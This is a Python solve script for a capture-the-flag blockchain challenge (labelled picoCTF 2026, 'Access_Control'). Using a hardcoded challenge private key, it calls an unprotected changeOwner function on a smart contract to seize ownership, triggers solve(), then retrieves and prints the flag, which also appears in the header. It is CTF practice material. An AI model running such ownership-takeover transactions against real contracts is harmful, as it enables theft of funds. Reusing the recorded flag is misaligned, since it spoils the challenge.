# 723 - Access_Control  (Blockchain, picoCTF 2026)
# Flag: academy{i_c4n_b3_0wn3r_7a45d669}
# Write-up: ../../../writeups/blockchain/723-access-control.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, time
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from ethlight import RPC, sign_tx, priv_to_address, selector, enc_addr, dec_string

RPC_URL = "http://xebec.cylabacademy.net:38995"
PK = "0xabb26f40c548c9bb05d51986cb80a78b1bbd42c6a3e53ef6d1ee1d10616c5ae1"
CONTRACT = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
EXPECT = "0xAF40AAa86fd903eAcB73C8f4746345a6C945Fce0"

rpc = RPC(RPC_URL)
me = priv_to_address(PK)
print("adresse derivee:", me)
print("correspond au joueur:", me.lower() == EXPECT.lower())
rpc.call("eth_blockNumber")
chain = int(rpc.call("eth_chainId"), 16)
gas_price = int(rpc.call("eth_gasPrice"), 16)
print("chainId:", chain, "gasPrice:", gas_price)

nonce = int(rpc.call("eth_getTransactionCount", [me, "pending"]), 16)
print("nonce:", nonce)

sel_change = selector("changeOwner(address)")
sel_solve = selector("solve()")
sel_get = selector("getFlag()")
print("selectors:", sel_change, sel_solve, sel_get)

for label, data in (("changeOwner", sel_change + enc_addr(me)),
                    ("solve", sel_solve)):
    signed = sign_tx(PK, CONTRACT, data=bytes.fromhex(data[2:]), nonce=nonce,
                     gas=150000, gas_price=gas_price, chain_id=chain)
    txh = rpc.send_tx(signed)
    print(label, "->", txh)
    rc = rpc.wait(txh)
    print("   status:", rc.get("status") if rc else None)
    nonce += 1

out = rpc.call_data(CONTRACT, sel_get, me)
print("getFlag brut:", out)
s = dec_string(out)
print("FLAG:", s)
